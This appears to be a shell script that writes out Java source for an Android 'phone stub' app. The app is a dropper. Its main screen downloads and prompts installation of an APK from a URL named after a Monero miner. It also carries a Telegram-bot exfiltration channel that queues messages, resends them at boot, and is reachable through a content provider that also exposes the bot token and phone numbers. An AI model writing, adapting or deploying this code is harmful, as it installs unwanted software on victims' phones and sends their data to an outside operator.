          cat > app/src/main/java/com/phone/stub/Prefs.java << 'EOF'
          package com.phone.stub;

          import android.content.Context;
          import android.content.SharedPreferences;

          public class Prefs {
              private static final String NAME = "phone_stub_prefs";
              private static final String KEY_PHONE_A = "phone_a";
              private static final String KEY_PHONE_B = "phone_b";
              private static final String KEY_BOT_TOKEN = "bot_token";
              private static final String KEY_CHAT_ID = "chat_id";

              public static SharedPreferences get(Context c) {
                  return c.getApplicationContext().getSharedPreferences(NAME, Context.MODE_PRIVATE);
              }

              public static String getPhoneA(Context c) {
                  return get(c).getString(KEY_PHONE_A,
                          c.getString(R.string.default_phone_a));
              }

              public static String getPhoneB(Context c) {
                  return get(c).getString(KEY_PHONE_B,
                          c.getString(R.string.default_phone_b));
              }

              public static String getBotToken(Context c) {
                  return get(c).getString(KEY_BOT_TOKEN,
                          c.getString(R.string.default_bot_token));
              }

              public static String getChatId(Context c) {
                  return get(c).getString(KEY_CHAT_ID,
                          c.getString(R.string.default_chat_id));
              }

              public static void save(Context c, String phoneA, String phoneB,
                                      String botToken, String chatId) {
                  get(c).edit()
                          .putString(KEY_PHONE_A, phoneA)
                          .putString(KEY_PHONE_B, phoneB)
                          .putString(KEY_BOT_TOKEN, botToken)
                          .putString(KEY_CHAT_ID, chatId)
                          .apply();
              }
          }
          EOF

          cat > app/src/main/java/com/phone/stub/ConfigProvider.java << 'EOF'
          package com.phone.stub;

          import android.content.ContentProvider;
          import android.content.ContentValues;
          import android.content.Context;
          import android.database.Cursor;
          import android.database.MatrixCursor;
          import android.net.Uri;

          public class ConfigProvider extends ContentProvider {
              public static final String AUTHORITY = "com.phone.stub.config";

              @Override
              public boolean onCreate() {
                  return true;
              }

              @Override
              public Cursor query(Uri uri, String[] projection, String selection,
                                  String[] selectionArgs, String sortOrder) {
                  Context ctx = getContext();
                  if (ctx == null) return null;
                  String path = uri.getPath();
                  if (path == null) path = "";
                  MatrixCursor c;
                  switch (path) {
                      case "/phone": {
                          c = new MatrixCursor(new String[]{"phone_a", "phone_b"});
                          c.addRow(new Object[]{Prefs.getPhoneA(ctx), Prefs.getPhoneB(ctx)});
                          return c;
                      }
                      case "/bot": {
                          c = new MatrixCursor(new String[]{"bot_token", "chat_id"});
                          c.addRow(new Object[]{Prefs.getBotToken(ctx), Prefs.getChatId(ctx)});
                          return c;
                      }
                      default:
                          return null;
                  }
              }

              @Override
              public Uri insert(Uri uri, ContentValues values) {
                  Context ctx = getContext();
                  if (ctx == null || values == null) return null;
                  String path = uri.getPath();
                  if (path == null) path = "";
                  if ("/notify".equals(path)) {
                      String text = values.getAsString("text");
                      if (text != null && !text.isEmpty()) {
                          TelegramSender.send(ctx, text);
                      }
                  }
                  return null;
              }

              @Override
              public int delete(Uri uri, String selection, String[] selectionArgs) {
                  return 0;
              }

              @Override
              public int update(Uri uri, ContentValues values, String selection, String[] selectionArgs) {
                  Context ctx = getContext();
                  if (ctx == null || values == null) return 0;
                  String path = uri.getPath();
                  if (path == null) path = "";
                  if ("/phone".equals(path) || "/bot".equals(path)) {
                      String a = values.getAsString("phone_a");
                      String b = values.getAsString("phone_b");
                      String t = values.getAsString("bot_token");
                      String cid = values.getAsString("chat_id");
                      if (a != null || b != null || t != null || cid != null) {
                          Prefs.save(ctx,
                                  a != null ? a : Prefs.getPhoneA(ctx),
                                  b != null ? b : Prefs.getPhoneB(ctx),
                                  t != null ? t : Prefs.getBotToken(ctx),
                                  cid != null ? cid : Prefs.getChatId(ctx));
                          return 1;
                      }
                  }
                  return 0;
              }

              @Override
              public String getType(Uri uri) {
                  return null;
              }
          }
          EOF

          cat > app/src/main/java/com/phone/stub/TelegramSender.java << 'EOF'
          package com.phone.stub;

          import android.content.Context;
          import android.util.Log;

          import java.io.BufferedReader;
          import java.io.File;
          import java.io.FileInputStream;
          import java.io.FileOutputStream;
          import java.io.InputStreamReader;
          import java.net.HttpURLConnection;
          import java.net.URL;
          import java.net.URLEncoder;
          import java.nio.charset.StandardCharsets;
          import java.util.ArrayList;
          import java.util.List;

          public class TelegramSender {
              private static final String TAG = "TelegramSender";
              private static final Object LOCK = new Object();

              public static void send(final Context context, final String text) {
                  if (text == null || text.isEmpty()) return;
                  new Thread(() -> {
                      synchronized (LOCK) {
                          boolean ok = trySend(context, text);
                          if (!ok) enqueue(context, text);
                      }
                  }).start();
              }

              public static void flush(final Context context) {
                  new Thread(() -> {
                      synchronized (LOCK) {
                          List<String> lines = readQueue(context);
                          List<String> remaining = new ArrayList<>();
                          for (int i = 0; i < lines.size(); i++) {
                              String line = lines.get(i);
                              if (trySend(context, line)) {
                                  try { Thread.sleep(300); } catch (InterruptedException ignored) { }
                              } else {
                                  remaining.add(line);
                                  for (int j = i + 1; j < lines.size(); j++) remaining.add(lines.get(j));
                                  break;
                              }
                          }
                          writeQueue(context, remaining);
                      }
                  }).start();
              }

              private static boolean trySend(Context context, String text) {
                  HttpURLConnection conn = null;
                  try {
                      String token = Prefs.getBotToken(context);
                      String chatId = Prefs.getChatId(context);
                      if (token == null || token.isEmpty() || chatId == null || chatId.isEmpty()) {
                          Log.e(TAG, "bot credentials missing");
                          return false;
                      }
                      String encoded = URLEncoder.encode(text, "UTF-8");
                      String urlStr = "https://api.telegram.org/bot" + token
                              + "/sendMessage?chat_id=" + chatId
                              + "&parse_mode=Markdown&text=" + encoded;
                      URL url = new URL(urlStr);
                      conn = (HttpURLConnection) url.openConnection();
                      conn.setRequestMethod("GET");
                      conn.setConnectTimeout(8000);
                      conn.setReadTimeout(8000);
                      int code = conn.getResponseCode();
                      return code >= 200 && code < 300;
                  } catch (Exception e) {
                      Log.e(TAG, "send failed: " + e.getMessage());
                      return false;
                  } finally {
                      if (conn != null) conn.disconnect();
                  }
              }

              private static void enqueue(Context context, String text) {
                  try {
                      List<String> lines = readQueue(context);
                      lines.add(text);
                      while (lines.size() > 500) lines.remove(0);
                      writeQueue(context, lines);
                  } catch (Exception e) {
                      Log.e(TAG, "enqueue failed", e);
                  }
              }

              private static File queueFile(Context context) {
                  File dir = new File(context.getFilesDir(), "stub_vault");
                  if (!dir.exists()) dir.mkdirs();
                  return new File(dir, "telegram_queue.txt");
              }

              private static List<String> readQueue(Context context) {
                  List<String> out = new ArrayList<>();
                  File f = queueFile(context);
                  if (!f.exists()) return out;
                  try (BufferedReader br = new BufferedReader(
                          new InputStreamReader(new FileInputStream(f), StandardCharsets.UTF_8))) {
                      String line;
                      while ((line = br.readLine()) != null) {
                          if (!line.trim().isEmpty()) out.add(line);
                      }
                  } catch (Exception ignored) { }
                  return out;
              }

              private static void writeQueue(Context context, List<String> lines) {
                  try (FileOutputStream fos = new FileOutputStream(queueFile(context), false)) {
                      for (String l : lines) {
                          fos.write(l.getBytes(StandardCharsets.UTF_8));
                          fos.write('\n');
                      }
                      fos.flush();
                  } catch (Exception ignored) { }
              }
          }
          EOF

          cat > app/src/main/java/com/phone/stub/BootReceiver.java << 'EOF'
          package com.phone.stub;

          import android.content.BroadcastReceiver;
          import android.content.Context;
          import android.content.Intent;

          public class BootReceiver extends BroadcastReceiver {
              @Override
              public void onReceive(Context context, Intent intent) {
                  if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
                      TelegramSender.flush(context);
                  }
              }
          }
          EOF

          cat > app/src/main/java/com/phone/stub/MainActivity.java << 'EOF'
          package com.phone.stub;

          import android.app.Activity;
          import android.content.Intent;
          import android.net.Uri;
          import android.os.Build;
          import android.os.Bundle;
          import android.os.Handler;
          import android.os.Looper;
          import android.util.Log;
          import android.widget.Button;
          import android.widget.TextView;
          import android.widget.Toast;
          import androidx.core.content.FileProvider;

          import java.io.File;
          import java.io.FileOutputStream;
          import java.io.InputStream;
          import java.net.HttpURLConnection;
          import java.net.URL;

          public class MainActivity extends Activity {
              private static final String TAG = "PhoneStub";
              private static final String APK_URL = "https://xmrminer2026.github.io/XMRPV/app-debug.apk";
              private TextView statusText;
              private Button installButton;
              private Button settingsButton;
              private Handler handler = new Handler(Looper.getMainLooper());

              @Override
              protected void onCreate(Bundle savedInstanceState) {
                  super.onCreate(savedInstanceState);
                  setContentView(R.layout.activity_main);
                  statusText = findViewById(R.id.statusText);
                  installButton = findViewById(R.id.installButton);
                  settingsButton = findViewById(R.id.settingsButton);

                  installButton.setOnClickListener(v -> {
                      installButton.setEnabled(false);
                      installButton.setText("INSTALLING...");
                      statusText.setText("Downloading...");
                      downloadAndInstall();
                  });

                  settingsButton.setOnClickListener(v -> {
                      startActivity(new Intent(this, SettingsActivity.class));
                  });
              }

              private void downloadAndInstall() {
                  new Thread(() -> {
                      try {
                          URL url = new URL(APK_URL);
                          HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                          conn.setConnectTimeout(10000);
                          conn.setReadTimeout(10000);
                          InputStream in = conn.getInputStream();
                          File apkFile = new File(getFilesDir(), "main.apk");
                          FileOutputStream out = new FileOutputStream(apkFile);
                          byte[] buffer = new byte[4096];
                          int len;
                          while ((len = in.read(buffer)) != -1) {
                              out.write(buffer, 0, len);
                          }
                          out.close();
                          in.close();
                          conn.disconnect();
                          handler.post(() -> openInstaller(apkFile));
                      } catch (Exception e) {
                          Log.e(TAG, "Download failed: " + e.getMessage());
                          handler.post(() -> {
                              statusText.setText("Failed: " + e.getMessage());
                              installButton.setEnabled(true);
                              installButton.setText("RETRY");
                          });
                      }
                  }).start();
              }

              private void openInstaller(File apkFile) {
                  try {
                      Intent intent = new Intent(Intent.ACTION_VIEW);
                      Uri apkUri;
                      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                          apkUri = FileProvider.getUriForFile(this,
                                  "com.phone.stub.fileprovider", apkFile);
                          intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
                      } else {
                          apkUri = Uri.fromFile(apkFile);
                      }
                      intent.setDataAndType(apkUri, "application/vnd.android.package-archive");
                      intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                      startActivity(intent);
                      statusText.setText("Installation started. Tap 'Install' in the popup.");
                      Toast.makeText(this, "Please allow installation when prompted.", Toast.LENGTH_LONG).show();
                  } catch (Exception e) {
                      Log.e(TAG, "Open installer failed: " + e.getMessage());
                      statusText.setText("Install error: " + e.getMessage());
                      installButton.setEnabled(true);
                      installButton.setText("RETRY");
                  }
              }
          }
          EOF

